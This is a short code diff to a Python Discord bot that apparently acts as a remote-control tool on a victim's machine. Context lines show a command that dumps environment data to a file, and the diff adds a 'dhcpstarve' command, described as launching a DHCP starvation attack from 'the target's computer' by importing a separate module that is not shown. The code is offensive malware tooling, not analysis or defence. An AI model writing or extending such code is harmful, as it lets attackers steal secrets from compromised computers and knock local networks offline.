@@ -167,5 +167,11 @@ async def envir(interaction: discord.Interaction):
     await asyncio.sleep(10)
     os.remove("env.txt")
 
+
+@client.tree.command(name="dhcpstarve", description="Activates a dhcp starvation attack from the target's computer",
+                     guild=GUILD_ID)
+async def dhcpstarve(interaction: discord.Interaction):
+    import dhcpstarvation
+
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
